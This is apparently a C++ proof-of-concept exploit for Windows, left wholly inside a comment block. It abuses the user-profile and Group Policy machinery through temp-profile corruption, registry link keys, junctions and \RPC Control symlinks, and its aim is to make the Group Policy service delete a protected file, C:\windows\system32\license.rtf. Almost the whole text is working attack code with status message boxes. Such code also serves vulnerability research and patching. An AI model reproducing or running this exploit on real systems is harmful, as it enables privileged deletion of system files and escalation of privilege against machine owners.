/*
#include <exploitLib/exploitLib.h>
#include <Lmcons.h>
using namespace x::literalNS;

auto getUsername()
{
    wchar_t usernamebuf[UNLEN + 1]{ 0x0000 };
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)usernamebuf, &size);

    static auto username = std::wstring{ usernamebuf };
    return username;
}

auto hkey_current_user = L"\\registry\\user\\"s + x::getCurrentUserSidString();
auto volatile_enviroment = hkey_current_user + L"\\Volatile Environment";

bool fixStatus()
{
    try
    {
        x::regKey{ volatile_enviroment }["status"] = 0x01;
        return true;
    }
    catch (...) {}

    for (auto& keyName : x::regKey{ volatile_enviroment }.getSubKeys())
    {
        x::regKey{ volatile_enviroment + L"\\"s + keyName }.deleteKey();
    }

    x::regKey{ volatile_enviroment }.deleteKey();

    x::createRegLinkKey{ volatile_enviroment , false }.setLinkDestination(
        hkey_current_user + L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Status\\GPExtensions\\{35378EAC-683F-11D2-A89A-00C04FBBCFA2}"
    );

    return false;
}


int main(int, char* args[])
try
{
    if (!"%USERPROFILE%"_p.ends_with(L"TEMP") && !x::file{ "%USERPROFILE%"_p }.getFinalPath().ends_with(L"profileBackup"))
    {
        if (MessageBox(0, L"Not logged in as temp user, messing up ntuser.dat", 0, MB_YESNO) == IDNO) return 0;
        x::file{ "%USERPROFILE%\\ntuser.dat:stream"_p ,FILE_WRITE_ATTRIBUTES }.makeappexec(L"", L"", L"");
        ExitWindows(0, 0);
        return 0;
    }

    if ( x::file{ "%USERPROFILE%"_p }.getFinalPath().ends_with(L"profileBackup") )
    {
        if (!fixStatus()) {
            if (MessageBox(0, L"Could not set status registry value. Symlink created , relogin", 0, MB_YESNO) == IDNO) return 0;
            ExitWindows(0, 0);
            return 0;
        }

        if (MessageBox(0, L"Profile files redirected to c:\profilebackup, making file synlinks and updating user group policy", 0, MB_YESNO) == IDNO) return 0;

        std::vector<x::symlink> symlinks;
        for (auto& f : x::file{ "C:\\profileBackup"_p }.enumDir())
        {
            symlinks.emplace_back(("\\RPC Control"_p / f), "\\??\\c:\\profileBackup"_p / f);
        }
        symlinks.emplace_back(L"\\RPC Control\\tempntuser.pol", "\\??\\c:\\windows\\system32\\license.rtf"_p);
        x::file{ "C:\\users\\"_p / getUsername() , FILE_WRITE_ATTRIBUTES, FILE_OPEN_REPARSE_POINT }.makeJunction("\\RPC Control");

        WaitForSingleObject(x::process::execute("%WINDIR%\\system32\\gpupdate.exe"_p, L"/Target:user /force").process, INFINITE);
     
        MessageBox(0, L"Group policy service should have deleted c:\\windows\\system32\\license.rtf now", 0, 0);
    }
    else
    {
        if (MessageBox(0, L"Logged in as temp user, moving profile files to c:\\profileBackup", 0, 0) == IDNO) return 0;
        x::file{ "C:\\profileBackup"_p ,FILE_READ_ATTRIBUTES  ,FILE_DIRECTORY_FILE };
        x::file{ "C:\\users\\"_p / getUsername() / "ntuser.dat:stream"_p, FILE_WRITE_ATTRIBUTES, FILE_OPEN_REPARSE_POINT }.delete_reparse_point(IO_REPARSE_TAG_APPEXECLINK);

        for (auto& f : x::file{ "C:\\users\\"_p / getUsername() }.enumDir())
        {
            x::file{ "C:\\users\\"_p / getUsername() / x::strpath{f} , DELETE | FILE_READ_ATTRIBUTES, FILE_OPEN_REPARSE_POINT }.rename("c:\\profileBackup"_p / f);
        }
        x::file{ "C:\\users\\"_p / getUsername() , FILE_WRITE_ATTRIBUTES }.makeJunction("C:\\profileBackup");
        ExitWindows(0, 0);
    }
}
catch (wil::ResultException& e)
{
    std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
    std::wcout << e.what() << std::endl;
}
catch (std::exception& e)
{
    std::wcout << e.what() << std::endl;
}
*/